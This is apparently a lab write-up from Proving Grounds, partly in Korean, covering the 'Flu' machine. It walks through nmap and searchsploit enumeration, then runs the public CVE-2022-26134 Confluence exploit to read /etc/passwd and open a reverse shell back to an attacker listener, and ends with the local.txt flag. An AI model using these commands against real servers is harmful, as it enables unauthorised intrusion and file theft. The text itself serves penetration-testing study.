---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/lin/container-escape
  - tech/lin/passwd-write
  - tech/enum/searchsploit
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.103.41
ports: [22, 8090, 8091]
services: [http, jamlink, ssh]
cves: [CVE-2022-26134]
status: solved
tech_count: 4
---
### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Flu]
└─$ nnmap 192.168.103.41
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-14 13:51 +0900
Nmap scan report for 192.168.103.41
Host is up (0.085s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 02:79:64:84:da:12:97:23:77:8a:3a:60:20:96:ee:cf (ECDSA)
|_  256 dd:49:a3:89:d7:57:ca:92:f0:6c:fe:59:a6:24:cc:87 (ED25519)
8090/tcp open  http     Apache Tomcat (language: en)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Log In - Confluence
|_Requested resource was /login.action?os_destination=%2Findex.action&permissionViolation=true
8091/tcp open  jamlink?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:41 GMT
|     Connection: Close
|   GetRequest:
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:09 GMT
|     Connection: Close
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:09 GMT
|     Connection: Close
|     content-length: 0
|   Help, Kerberos, LDAPSearchReq, LPDString, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 414 Request-URI Too Long
|     text is empty (possibly HTTP/0.9)
|   RTSPRequest:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:10 GMT
|     Connection: Keep-Alive
|     content-length: 0
|   SIPOptions:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:47 GMT
|     Connection: Keep-Alive
|_    content-length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8091-TCP:V=7.98%I=7%D=7/14%Time=6A55C079%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,68,"HTTP/1\.1\x20204\x20No\x20Content\r\nServer:\x20Aleph/0\.4
SF:\.6\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:52:09\x20GMT\r\nConnect
SF:ion:\x20Close\r\n\r\n")%r(HTTPOptions,EC,"HTTP/1\.1\x20200\x20OK\r\nAcc
SF:ess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\
SF:r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\
SF:nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:5
SF:2:09\x20GMT\r\nConnection:\x20Close\r\ncontent-length:\x200\r\n\r\n")%r
SF:(RTSPRequest,F1,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin:
SF:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\r\nAccess-Control-Allow-M
SF:ethods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\nServer:\x20Aleph/0\.4\.6
SF:\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:52:10\x20GMT\r\nConnection
SF::\x20Keep-Alive\r\ncontent-length:\x200\r\n\r\n")%r(Help,46,"HTTP/1\.1\
SF:x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(po
SF:ssibly\x20HTTP/0\.9\)")%r(SSLSessionReq,46,"HTTP/1\.1\x20414\x20Request
SF:-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\
SF:.9\)")%r(TerminalServerCookie,46,"HTTP/1\.1\x20414\x20Request-URI\x20To
SF:o\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(T
SF:LSSessionReq,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\n
SF:text\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(Kerberos,46,"HTTP/
SF:1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x2
SF:0\(possibly\x20HTTP/0\.9\)")%r(FourOhFourRequest,68,"HTTP/1\.1\x20204\x
SF:20No\x20Content\r\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2014\x20J
SF:ul\x202026\x2004:52:41\x20GMT\r\nConnection:\x20Close\r\n\r\n")%r(LPDSt
SF:ring,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20
SF:is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(LDAPSearchReq,46,"HTTP/1\.
SF:1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(
SF:possibly\x20HTTP/0\.9\)")%r(SIPOptions,F1,"HTTP/1\.1\x20200\x20OK\r\nAc
SF:cess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000
SF:\r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r
SF:\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:
SF:52:47\x20GMT\r\nConnection:\x20Keep-Alive\r\ncontent-length:\x200\r\n\r
SF:\n");
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   85.01 ms 192.168.45.1
2   84.99 ms 192.168.45.254
3   84.63 ms 192.168.251.1
4   84.67 ms 192.168.103.41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.25 seconds
```

8090 포트 접근 시 Atlassian 버전 확인
![[Pasted image 20260714140908.png]]


searchsploit 에는 검색되는 exploit 없음
```bash
┌──(kali㉿kali)-[~/PG/Flu]
└─$ searchsploit atlassian 7.
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
AppFusions Doxygen for Atlassian Confluence 1.3.2 - Cross-Site Scri | java/webapps/40817.txt
Atlassian Confluence 7.12.2 - Pre-Authorization Arbitrary File Read | java/webapps/50377.txt
Atlassian Confluence < 8.5.3 - Remote Code Execution                | multiple/webapps/51904.py
Atlassian JIRA 3.7.3 - BrowseProject.JSPA Cross-Site Scripting      | jsp/webapps/29576.txt
Atlassian Tempo 6.4.3 / JIRA 5.0.0 / Gliffy 3.7.0 - XML Parsing Den | jsp/dos/37218.txt
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
![[Pasted image 20260714141054.png]]

다른 포트`8090/tcp open jamlink` 검색 시 atlassian CVE 발견

![[Pasted image 20260714141017.png]]

유효 버전 확인
![[Pasted image 20260714141213.png]]

exploit 다운로드
```bash
┌──(kali㉿kali)-[~/PG/Flu]
└─$ git clone https://github.com/jbaines-r7/through_the_wire.git
Cloning into 'through_the_wire'...
remote: Enumerating objects: 25, done.
remote: Counting objects: 100% (25/25), done.
remote: Compressing objects: 100% (22/22), done.
Receiving objects: 100% (25/25), 11.17 KiB | 11.17 MiB/s, done.
Resolving deltas: 100% (12/12), done.
remote: Total 25 (delta 12), reused 8 (delta 3), pack-reused 0 (from 0)
```

![[Pasted image 20260714141236.png]]

exploit 실행하여 /etc/passwd 확인 가능
```bash
┌──(kali㉿kali)-[~/PG/Flu/through_the_wire]
└─$ python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.45.244 --protocol http:// --read-file /etc/passwd
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:24: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__  _ __ ___  _   _  __ _| |__  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:25: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:27: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:30: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__   ___  / / /\ \ (_)_ __ ___  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:31: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:32: SyntaxWarning: invalid escape sequence '\ '
  print("   / /  | | | |  __/  \  /\  /| | | |  __/ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:33: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|\___|   \/  \/ |_|_|  \___| ")

   _____ _                           _
  /__   \ |__  _ __ ___  _   _  __ _| |__
    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \
   / /  | | | | | | (_) | |_| | (_| | | | |
   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|
                               |___/
   _____ _            __    __ _
  /__   \ |__   ___  / / /\ \ (_)_ __ ___
    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \
   / /  | | | |  __/  \  /\  /| | | |  __/
   \/   |_| |_|\___|   \/  \/ |_|_|  \___|

                 jbaines-r7
               CVE-2022-26134
      "Spit my soul through the wire"
                     🦞

[+] Forking a netcat listener
[+] Using /usr/bin/nc
[+] Generating a payload to read: /etc/passwd
[+] Sending expoit at http://192.168.103.41:8090/
listening on [any] 1270 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.103.41] 40720
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:106::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:101:1::/var/cache/pollinate:/bin/false
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
syslog:x:103:109::/nonexistent:/usr/sbin/nologin
uuidd:x:104:110::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:111::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:113::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:108:114:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:115:MySQL Server,,,:/nonexistent:/bin/false
confluence:x:1001:1001:Atlassian Confluence:/home/confluence:/bin/sh
```

쉘 획득
```bash
┌──(kali㉿kali)-[~/PG/Flu/through_the_wire]
└─$ python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.45.244 --protocol http:// --reverse-shell
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:24: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__  _ __ ___  _   _  __ _| |__  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:25: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:27: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:30: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__   ___  / / /\ \ (_)_ __ ___  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:31: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:32: SyntaxWarning: invalid escape sequence '\ '
  print("   / /  | | | |  __/  \  /\  /| | | |  __/ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:33: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|\___|   \/  \/ |_|_|  \___| ")

   _____ _                           _
  /__   \ |__  _ __ ___  _   _  __ _| |__
    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \
   / /  | | | | | | (_) | |_| | (_| | | | |
   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|
                               |___/
   _____ _            __    __ _
  /__   \ |__   ___  / / /\ \ (_)_ __ ___
    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \
   / /  | | | |  __/  \  /\  /| | | |  __/
   \/   |_| |_|\___|   \/  \/ |_|_|  \___|

                 jbaines-r7
               CVE-2022-26134
      "Spit my soul through the wire"
                     🦞

[+] Forking a netcat listener
[+] Using /usr/bin/nc
[+] Generating a reverse shell payload
[+] Sending expoit at http://192.168.103.41:8090/
listening on [any] 1270 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.103.41] 46170
bash: cannot set terminal process group (841): Inappropriate ioctl for device
bash: no job control in this shell
confluence@flu:/opt/atlassian/confluence/bin$ whoami
whoami
confluence
confluence@flu:/opt/atlassian/confluence/bin$
confluence@flu:/opt/atlassian/confluence$ cd /home/confluence
cd /home/confluence
confluence@flu:/home/confluence$ ls
ls
local.txt
confluence@flu:/home/confluence$ cat local.txt
cat local.txt
2d0c7239ce98c1add6986385f076c26e
confluence@flu:/home/confluence$
```
![[Pasted image 20260714142017.png]]
